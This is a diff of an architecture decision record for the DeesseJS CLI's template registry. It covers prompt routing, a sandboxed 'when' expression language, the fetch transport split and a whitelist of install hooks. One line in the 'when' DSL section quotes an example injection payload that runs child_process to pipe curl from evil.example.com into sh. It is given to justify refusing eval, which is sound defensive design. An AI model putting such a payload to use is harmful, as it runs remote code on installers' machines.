@@ -140,7 +140,7 @@ The current `TemplateV1` is extended (not replaced) into `TemplateV2`. Every fie
 - `templateDependencies: string[]` — slugs of other templates required by this one. Composable templates (the `packages-template` + `auth-addon` pattern).
 - `type: "template:app" | "template:package" | "template:cli" | "template:mobile" | "template:desktop" | "template:agent" | "template:landing"` — discriminates whether the install clones an entire project (`template:app`) or overlays files onto an existing one (the other six types).
 - `docs: string` (optional) — path to a Markdown doc inside the template repo, surfaced by `deessejs info <slug>`.
-- `prompts: Prompt[]` (optional) — interactive questions at install time. Each prompt has `name`, `type` (`text`, `select`, `confirm`), `message`, `default`, optional `choices[]` (for `select`), optional `validate` (regex string), optional `when` (a simple DSL expression that gates the prompt against earlier answers — `"database != 'sqlite'"` skips the prompt when the database choice is SQLite), optional `consumes: Consume[]` (explicit routing of the prompt's answer to a project-side target — see "Prompt consumption" below). When `consumes[]` is absent, the CLI applies a name-based implicit convention (also documented below).
+- `prompts: Prompt[]` (optional) — interactive questions at install time. Each prompt has `name`, `type` (`text`, `select`, `confirm`), `message`, `default`, optional `choices[]` (for `select`), optional `validate` (regex string), optional `when` (a sandboxed DSL expression — see Decision #2c below), optional `consumes: Consume[]` (explicit routing of the prompt's answer to a project-side target — see "Prompt consumption" below). When `consumes[]` is absent, the CLI applies a name-based implicit convention (also documented below).
 - `hooks: { preInit?, postInit?, preInstall?, postInstall? }` (optional) — declarative lifecycle hooks. Each value is an ordered list of verb names from the runtime whitelist (`postinstall`). The hooks run at the named lifecycle stage; `postInit` fires after the clone + transforms, before the install step; `postInstall` fires after the package manager install. The block is parallel to `postinstall[]` and supersedes it for new templates: `hooks.postInit` is the canonical entry, `postinstall[]` is preserved as a back-compat alias.
 - `postinstall: string[]` (optional) — whitelisted shell verbs. Kept as a back-compat alias for `hooks.postInit`; new templates use `hooks{}` instead.
 - `files: FileSpec[]` (optional) — post-processing on the cloned tree. Each file has `path` (source in the template repo), `type` (`template:env`, `template:doc`, `template:config`, etc.), `target` (destination in the user's project, with `@components/`, `@lib/`, `@hooks/`, `@ui/`, `@apps/`, `@packages/` placeholders resolved against [ADR-031](./ADR-031-deesse-json.mdx)'s `deesse.json#aliases`), and `transform` (the verb: `rename`, `interpolate`, `remove`, `merge`).
@@ -172,7 +172,7 @@ The four targets, by target discriminator:
 4. `name` matches `/_(path|dir|route)$/` → `project:paths.<x>` (the prompt name mapped to the matching `paths` key; e.g. `db_path` → `project:paths.db`).
 5. Otherwise → `template:<key>` (answer lives in memory only).
 
-The `with_*` convention is the trickiest. A prompt `name: "with_storybook"` of `type: "confirm"` with `default: true` is interpreted as "the template ships a `storybook/` subtree; remove it if the user answers false". The CLI computes the candidate paths by walking the cloned template tree and looking for directories whose name matches the suffix (`storybook/`), or for files tagged `transform: "remove"` whose `target` ends with `<name-without-with_>.removed`. The implicit rule is documented; a template that wants precision declares `consumes[]` explicitly.
+The `with_*` convention is the trickiest. A prompt `name: "with_storybook"` of `type: "confirm"` with `default: true` is interpreted as "the template ships a `storybook/` subtree; remove it if the user answers false". The CLI **does not inspect the cloned tree at prompt-collection time** (the clone has not happened yet — see Decision #3 step ordering); the routing step (step 5) records a `file:.<dir>/` target in memory keyed by the prompt's boolean answer. The application step (step 8) walks the clone and removes paths matching the recorded target. The implicit rule is documented; a template that wants precision declares `consumes[]` explicitly with an explicit `file:<glob>`.
 
 **Explicit `consumes[]` (overrides the convention).** When the author declares `consumes[]`, every entry is honoured in order and the implicit convention does not fire. The shape:
 
@@ -184,17 +184,43 @@ The `with_*` convention is the trickiest. A prompt `name: "with_storybook"` of `
   "default": "",
   "when": "database != 'sqlite'",
   "consumes": [
-    { "target": "tokens:DATABASE_URL" },
-    { "target": "file:./prisma/schema.prisma", "format": "url    = env(\"DATABASE_URL\")" }
+    { "target": "tokens:DATABASE_URL" }
   ]
 }
 ```
 
-The `format` field is template-side syntax that lets the answer be reformatted before landing. In the example above, the prompt's raw answer `postgresql://localhost/mydb` is written verbatim into `tokens.DATABASE_URL`, AND the file `prisma/schema.prisma` is rewritten to replace its `url` line with `url = env("DATABASE_URL")`. The `format` DSL is intentionally minimal: the placeholder `{{value}}` is the only interpolation, and a fixed prefix/suffix wraps it.
+The `consumes[]` block is intentionally minimal: each entry has a `target` discriminator only. No `format`, no `pattern`, no `replace` — those would require the CLI to parse arbitrary file formats (Prisma schema, YAML, TOML, etc.) at install time, which is fragile and out of scope for V2. A template author who wants the URL to land in a specific place in a non-`.env` file writes the file as a template (e.g. `schema.prisma.template`) with a `{{DATABASE_URL}}` placeholder, declares a `files[]` entry that copies the template to the target path with `transform: "interpolate"`, and the placeholder is replaced at step 8 by the same `tokens.<KEY>` interpolation that already powers `.env` files.
 
 **Precedence and idempotency.** If a prompt declares `consumes[]`, the convention does not fire. If two prompts target the same key (`tokens.DATABASE_URL`), the second wins (last-write-wins; the CLI logs a warning at install time, not a hard error). A user who runs `deessejs init` with `--yes` skips prompts entirely; the `default` answers still fire the `consumes[]` rules (the convention applies to defaults the same way as to user answers). Idempotency: re-running `init` with a changed answer writes the new value and leaves the previous `deesse.json#tokens.<KEY>` only if the new value equals the default (a no-op skip).
 
 **Why both layers, not one.** The implicit convention covers 95% of templates with zero author effort. The explicit `consumes[]` covers the 5% — typically when a prompt's answer has to land in a file in a non-default format, or when the convention's name pattern misfires (e.g. a prompt named `database` that does not target `project:database`). Shipping one layer only would either force every template author to declare `consumes[]` (verbose) or break on the 5% (silent miss). Both layers, with explicit-override-implicit, is the trade-off that costs the fewest template-author words.
+
+#### 2c. The `when` DSL is sandboxed (no eval, no Function)
+
+The `when` field on each prompt is a string expression evaluated against the answers collected so far. Examples:
+
+```
+"database != 'sqlite'"
+"with_auth == true"
+"database in ['postgresql', 'mysql']"
+```
+
+The expression grammar is intentionally small:
+
+```
+expr     ::= comparison ( ("&&" | "||") comparison )*
+comparison ::= identifier ( ("==" | "!=" | "in") value )
+identifier ::= [a-z_][a-z0-9_]*
+value      ::= string-literal | number-literal | boolean-literal | array-literal
+```
+
+Supported operators: `==`, `!=`, `in`. Logical combinators: `&&`, `||`. Parentheses for grouping: `(...)`. String literals use single quotes only. That is the entire grammar.
+
+**The expression is parsed into a small AST and evaluated by a tree-walking interpreter. No `eval()`, no `new Function()`, no `vm` module, no dynamic compilation.** The interpreter is implemented in `apps/cli/src/prompts/when.ts` (one file per concept) and exports two functions: `parseWhen(input: string): WhenNode` and `evalWhen(node: WhenNode, answers: Record<string, unknown>): boolean`. A `when` that fails to parse (unknown operator, malformed literal, identifier collision with a JS reserved word) is rejected at item-fetch time with `parse_error`, before the prompt is shown. The parser is unit-tested in `apps/cli/test/unit/when.test.ts` with one fixture per operator and per combinator, plus a fixture for the "unknown operator → parse_error" path.
+
+**Why this matters.** A registry item authored by a third party could ship `when: "1; require('child_process').exec('curl evil.example.com | sh'); 1"` and trick a naive `eval`-based interpreter into executing arbitrary code at install time. The sandboxed AST interpreter closes that hole: the parser refuses the input as a syntax error before evaluation ever happens. The trade-off is a narrower DSL (no function calls, no method calls, no arithmetic), which is acceptable because the use case is gating — boolean decisions against prior answers, not general computation.
+
+**`when` against an unknown identifier.** If the `when` references `database` and the user runs `--yes` (skipping prompts), the `database` answer has the documented `default` value. If the prompt is gated by another `when` and never fires, the answer is `undefined`. The interpreter treats `undefined` as failing any `==` comparison (unless compared to `null`); `in` against an `undefined` left side is a runtime error caught by the interpreter and re-raised as `parse_error`. This is the documented behaviour; a template author who wants a different default for `undefined` answers uses a `default` on the prompt, not a `when` that tests for it.
 
 #### 3. CLI install flow is enriched by `deesse.json`
 
@@ -204,7 +230,7 @@ The CLI's `init <slug>` command gains the following sequence:
 2. Fetch `deesse-template.json` from the registry host (per Decision #4).
 3. Validate against the `TemplateV2` Zod schema. Reject with `parse_error` on failure.
 4. Resolve `templateDependencies` recursively (each dependency is fetched and validated the same way).
-5. Run `prompts[]` in declaration order, applying `when` gates against prior answers. Skip with `--yes`; the documented `default` applies. **Each answer is routed via the consumption rules (Decision #2b above)**: declared `consumes[]` first, implicit convention otherwise. Routing happens before step 7 so that `tokens.<KEY>` is populated when the file transforms read it, and before step 8 so that file removals are applied with the correct paths.
+5. Run `prompts[]` in declaration order, applying `when` gates against prior answers. Skip with `--yes`; the documented `default` applies. **Routing happens in two phases**: phase A (this step) collects each answer and resolves it into a `Map<promptName, ConsumeTarget>` in memory. Phase B (step 8) walks the cloned tree and applies `file:` targets recorded in the map. `tokens:` and `project:database` targets are written at phase A (no disk state required); `file:` targets are deferred to phase B because the disk state does not exist yet.
 6. Run `hooks.preInit` (if present).
 7. Clone the template repo at `source.ref` (or fall back to `main` / `master`).
 8. Apply `files[]` transformations (rename, interpolate against `deesse.json#tokens`, remove, merge).
@@ -234,7 +260,15 @@ What stays on `app.deessejs.com` (the existing oRPC host, per ADR-021):
 - The `templates.get` procedure (returns one item, the same shape as `/r/<slug>.json`).
 - All auth flows, all device-flow endpoints, all session-aware code paths.
 
-The CLI may fetch from either source. The static host (`registry.deessejs.dev`) is the **primary source** for `init <slug>` (one item, immutable between releases). The oRPC endpoint (`app.deessejs.com`) is the **primary source** for `list` and `info` (live, possibly rate-limited, possibly enriched with non-public metadata later). Today both endpoints return the same shape; tomorrow the two sources may diverge if non-public fields land on the oRPC side (e.g. private templates behind auth).
+**Transport split, made explicit.** The CLI does **not** fetch the registry CDN through oRPC. The CLI issues plain `fetch('https://registry.deessejs.dev/r/<slug>.json')` for `init <slug>` and `add <feature>`, and uses the typed oRPC client for `templates.list` / `templates.info` / `auth.*` / version probe. The split is:
+
+| Surface | Transport | Host | Why |
+|---|---|---|---|
+| `init <slug>`, `add <feature>` (fetch one item) | Plain `fetch` over HTTPS | `registry.deessejs.dev` | Static, immutable between releases, CDN-cached. No typing needed at the wire (Zod validates on receipt). |
+| `list`, `info`, `auth.*`, version probe | Typed oRPC client | `app.deessejs.com` | Live, session-aware, possibly enriched with non-public fields. |
+| Third-party registries (`@community/...`) | Plain `fetch` over HTTPS | User-declared host in `deesse.json#registries` | Same shape as the official CDN; same plain-`fetch` consumer. |
+
+This requires an amendment to [ADR-001](./ADR-001-orpc-is-load-bearing.mdx) §"What this rule forbids" to carve out an explicit exception for plain-HTTPS `fetch` against (a) the registry CDN and (b) third-party registry hosts. ADR-001's load-bearing rule — "no parallel REST envelope for the internal API" — stays intact; the amendment is a clarification of scope, not a relaxation. The ticket for that amendment is tracked alongside this PR.
 
 Provisioning requirements (called out here so the implementation PR has a checklist):
 
@@ -276,7 +310,7 @@ Three patterns the team considered and rejected.
 ### What this rule does not change
 
 - The CLI's three commands (`init`, `list`, `info`) and the `auth` group stay the public surface per ADR-010 §1. This ADR adds no new public command.
-- The CLI's typed oRPC client at `apps/cli/src/api/client.ts` stays the only outbound transport per ADR-001. `deesse-template.json` is fetched through the same client (`templates.list` returns it as part of the enrichment layer).
+- The CLI's typed oRPC client at `apps/cli/src/api/client.ts` stays the outbound transport for `list` / `info` / `auth.*` / version probe per ADR-001. `deesse-template.json` is **not** fetched through the oRPC client — it is fetched via plain `fetch` against `registry.deessejs.dev` (or a third-party registry host declared in `deesse.json#registries`). The split is documented in Decision #4 above; the corresponding amendment to ADR-001 is tracked alongside this PR.
 - The cache directory (`~/.deessejs/`) and the cache file shape stay as documented by ADR-010 §4. `deesse-template.json` responses share the cache; the cache format is opaque (per ADR-010 §4).
 - The closed-list `CliErrorCode` per ADR-010 §2 stays closed. New install failures (post-install script fail, transform fail) map to `install_failed` (already on the internal list) or to `parse_error` for malformed `deesse-template.json`.
 - The `engines.node >= 20.0.0` floor at `apps/cli/package.json` stays. The CLI continues to publish as `@deessejs/cli` per ADR-010 §6.
@@ -292,7 +326,7 @@ Three patterns the team considered and rejected.
 - **`apps/cli` learns to apply `files[]` transformations.** The init flow gains a transform step that walks `deesse-template.json#files[]`, substitutes `@components/`, `@lib/`, `@hooks/`, `@ui/`, `@apps/`, `@packages/` against `deesse.json#aliases` (per [ADR-031](./ADR-031-deesse-json.mdx)), and applies the `transform` verb (`rename`, `interpolate`, `remove`, `merge`). The verbs live in `apps/cli/src/transforms/` (new folder) — one file per verb, following the one-folder-per-concept rule from ADR-002 and the command-file invariant from ADR-010.
 - **`apps/cli` learns to route prompt answers.** A new module `apps/cli/src/prompts/consume.ts` (one file per concept) implements the consumption rules from Decision #2b. The module exposes `routeAnswer(prompt, answer, projectRoot): void` and is called once per answer at step 5 of the install flow. The implicit-convention rules (the four name patterns and the priority order) live as a closed-list constant in the same file, alongside the `Consume` discriminated-union parser. The convention is unit-tested in `apps/cli/test/unit/prompt-consume.test.ts` with one fixture per convention rule plus one for the explicit-override path; no fixture for the edge case (last-write-wins collision on the same key) is required because the behaviour is documented as a logged warning, not a hard error.
 - **`packages/ui/src/deploy-button.tsx` and `packages/ui/src/demo-button.tsx` may consume `deesse-template.json#docs`.** Out of scope for this ADR; a follow-up can wire the gallery to surface docs. The `apps/web/src/app/(product)/templates/[template_slug]/page.tsx` page renders the existing enriched metadata; the docs field is an additive read.
-- **The `postinstall` whitelist lives in `apps/cli/src/commands/init.ts` as a closed-list constant.** Initial whitelist: `["pnpm install", "pnpm add", "pnpm remove", "pnpm db:push", "pnpm db:migrate", "pnpm format", "pnpm typecheck", "npm install", "yarn install", "bun install", "git init"]`. Adding a verb is an internal change (not a new public error code, not a new flag).
+- **The `postinstall` (and `hooks.preInit` / `hooks.postInit` / `hooks.postInstall`) whitelist lives in `apps/cli/src/hooks/whitelist.ts` as a closed-list constant.** Initial whitelist with the `{pm}` placeholder: `["{pm} install", "{pm} add", "{pm} remove", "{pm} db:push", "{pm} db:migrate", "{pm} db:generate", "{pm} generate", "{pm} format", "{pm} typecheck", "git init"]`. The CLI substitutes `{pm}` with the detected package manager (read from `deesse.json#packageManager`, falling back to `--pm` override, falling back to the lockfile-detected PM per `apps/cli/src/utils/detect-pm.ts`). A verb that contains `{pm}` is normalised before substitution; a verb that does not match the whitelist after normalisation (e.g. a typo, an unsupported command, a missing `{pm}` placeholder where one is expected) is rejected at item-fetch time with `parse_error`. The whitelist is a closed list: adding a new verb is an internal change (not a new public error code, not a new flag), but the change must keep the `git init` carve-out and the `{pm}`-parameterised shape — adding a hardcoded `npm install` or `pnpm db:push` would re-introduce the portability bug that `{pm}` fixes.
 - **A template author adds `deesse-template.json` to their repo's root, with the `$schema` URL pointing at `https://registry.deessejs.dev/schema/template.json`.** The schema is published from the registry host (a static file at `/schema/template.json`); the same pattern works for `deesse.json` at `/schema/project.json` (per [ADR-031](./ADR-031-deesse-json.mdx)). The schema URL is the contract.
 - **A template repo's CI runs `ajv validate --spec https://registry.deessejs.dev/schema/template.json --strict < deesse-template.json`.** This is opt-in (the CLI does not require it), but recommended. The CLI's own internal validator at `apps/cli/src/commands/init.ts` uses the same schema via Zod's `parseAsync`, returning `parse_error` on failure. The Zod schema lives in `@workspace/contracts` and is exported as `TemplateV2`; the JSON Schema is generated from it (a CI job in `packages/contracts` regenerates the JSON Schema on every release).
 - **`packages/contracts` gains a CI job that publishes JSON Schemas.** Triggered on every release of `@workspace/contracts`. The job runs `zod-to-json-schema` (or equivalent) over the `TemplateV2` and the embedded `Project` (the `deesse.json` root type per [ADR-031](./ADR-031-deesse-json.mdx)) Zod schemas, writes the result to `packages/contracts/dist/schema/{project,template}.json`, and deploys those two files to the static host at `/schema/{project,template}.json`. The job is non-breaking at the contract level (it produces files, it doesn't change types).
@@ -307,15 +341,19 @@ Three design calls surfaced during review and remain open in this version of the
 
 ### Question 1: ship `deessejs add @namespace/slug` as a V2 feature?
 
-shadcn's `add` is the headline command. DeesseJS's `init` is the headline today. Adding `add` requires either (a) bumping the CLI surface (breaking per ADR-010 §1) or (b) implementing `add` as an alias for `init <slug>` that reads `deesse.json#registries` (per [ADR-031](./ADR-031-deesse-json.mdx)) to resolve the namespace. Option (b) is non-breaking but blurs the meaning of `init` (today: clone a project; tomorrow: also overlay files). The team's preference: defer `add` to V3; keep `init` as the single install verb in V2. The strongest motivation for `add` in V3 is the `deesse.json#database` + `deesse.json#paths` blocks added by [ADR-031](./ADR-031-deesse-json.mdx): a user who wants to layer `crud` or `auth` onto an existing project needs a command that reads those blocks and writes into the right directories without re-running the full clone.
+**Resolved: defer to V3, tracked by [ADR-033](./ADR-033-deessejs-add.mdx).** The review flagged that the strongest motivation for `add` (the `deesse.json#database` + `deesse.json#paths` blocks) only exists once ADR-031 lands, which is the same release as this ADR. Bundling two new public commands (`init` refactor + new `add`) in one release is a bigger blast radius than spreading them. V2 ships the file-shape change and keeps the existing three-command CLI surface; V3 ships `add` as a deliberate surface bump tracked separately. The companion ADR-033 already pins the breaking change to ADR-010 §1; the implementation PR for `add` will land against V3, not against this PR.
 
 ### Question 2: pin the `postinstall` whitelist at this size, or smaller?
 
-The proposed whitelist is eleven verbs. shadcn's analogue is implicit (any `pnpm`/`npm` script). The team needs to decide whether the whitelist's verbosity is a feature (clear contract) or a liability (template authors hit the wall when they need `pnpm prisma generate`). The default this ADR proposes is the eleven-verb list; a smaller V1 whitelist (five verbs) is acceptable if reviewers prefer.
+**Resolved.** The whitelist is pinned at the `{pm}`-parameterised shape documented in Consequences above (nine entries: eight `{pm}`-parameterised, one hardcoded `git init`). The review feedback flagged that the previous eleven-verb hardcoded list would fail on any user who picked `bun` or `npm` at install time (`pnpm db:push` would error), and that it would also miss common verbs (`prisma generate`, `drizzle-kit push`). The `{pm}` placeholder solves both: the verb is portable across package managers, and the list of eight `{pm}`-parameterised verbs covers the common cases (`install`, `add`, `remove`, `db:push`, `db:migrate`, `db:generate`, `generate`, `format`, `typecheck`) without making the list rigid.
 
-### Question 3: namespaces in V2 or V3?
+### Question 3: ship `deessejs add` in V2, defer to V3, or rename?
 
-The `deesse.json#registries` map is in [ADR-031](./ADR-031-deesse-json.mdx). Whether the CLI ships the auto-discovery behaviour (a public repo with a `registry.json` at its root is automatically a registry) in V2 or V3 is open. V2 ships the explicit `registries{}` map; V3 may add the auto-discovery. The decision is independent of the rest of this ADR.
+**Resolved: defer to V3.** The review flagged that shipping `deessejs add` in V2 alongside ADR-033 would mean two new public commands in one release (the `init` refactor for ADR-031/032 plus the new `add` command). Spreading public-surface changes across releases is safer than bundling them. V2 ships the file-shape change (ADR-031, ADR-032, this ADR) and leaves the existing three-command CLI surface unchanged. V3 ships `deessejs add <feature>` as a deliberate CLI surface bump (tracked by ADR-033, which already pins the breaking change to ADR-010 §1).
+
+### Question 4: namespaces in V2 or V3?
+
+**Resolved: explicit `registries{}` map in V2, auto-discovery in V3.** The review flagged that the GitHub auto-discovery (a public repo with a `registry.json` at its root is automatically a registry) is unsolved at the rate-limit level: a CLI that auto-probes every repo the user encounters would hit GitHub's 60-req/h unauthenticated limit within minutes. The explicit `registries{}` map in `deesse.json` (per [ADR-031](./ADR-031-deesse-json.mdx)) avoids the probe entirely — the user declares which hosts they trust, and the CLI only fetches from those. V2 ships the explicit map; V3 may add auto-discovery gated on an opt-in (e.g. `--discover` flag) with explicit rate-limit handling (cached `HEAD` requests, ETag revalidation, user-prompted probe).
 
 ## Cross-references
 
@@ -335,7 +373,7 @@ The `deesse.json#registries` map is in [ADR-031](./ADR-031-deesse-json.mdx). Whe
 - [ADR-004: API package structure](./ADR-004-api-package-structure.md). The single exception that pins `packages/api/src/templates.ts` as the static registry source. This ADR keeps that placement; the file's entries gain typed `TemplateV2` fields.
 - [ADR-005: API is consumer-agnostic](./ADR-005-api-consumer-agnostic.md). The server-side counterpart. ADR-005 says the server does not name the consumer; this ADR says the registry item is consumer-agnostic at the wire level (`TemplateV2` carries the shape; the CLI is one consumer, the web gallery is another).
 - [ADR-010: CLI public surface](./ADR-010-cli-public-surface.md). The invariants that fence the CLI's published surface. This ADR is non-breaking at the CLI level: no new public command, no new public flag, no new public error code. The closed-list `CliErrorCode` stays closed; `install_failed` and `parse_error` cover the new failure modes.
-- [ADR-001 §"What this rule forbids"](./ADR-001-orpc-is-load-bearing.md#what-this-rule-forbids). The list of forbidden workarounds (custom envelope, parallel REST, client-side workaround). This ADR does not introduce any of them; `deesse-template.json` is fetched through the typed oRPC client.
+- [ADR-001 §"What this rule forbids"](./ADR-001-orpc-is-load-bearing.md#what-this-rule-forbids). The list of forbidden workarounds (custom envelope, parallel REST, client-side workaround) for the internal API. This ADR does not introduce any of them for the internal API surface. The plain-`fetch` exception for the registry CDN and third-party registries is a clarification of ADR-001's scope, not a relaxation; the corresponding ADR-001 amendment is tracked alongside this PR.
 - [ADR-031: deesse.json](./ADR-031-deesse-json.mdx). The companion ADR. Together they replace the hand-curated registry array and the opaque git clone with a typed, dependency-aware, transform-capable surface.
 - [shadcn `registry-item.json` schema](https://ui.shadcn.com/docs/registry/registry-item-json). The reference model for `deesse-template.json`. The item types differ (`template:app`, `template:package`, etc. instead of `registry:ui`, `registry:lib`, etc.); the field structure (`files[]`, `dependencies[]`, `registryDependencies[]` → `templateDependencies[]`, `cssVars` → not applicable, the new `hooks{}` block) is parallel.
 - [shadcn registry getting started](https://ui.shadcn.com/docs/registry/getting-started). The reference for the URL format (`{host}/r/{name}.json`) and the static-JSON auto-discovery convention (`registry.json` at a public repo root).
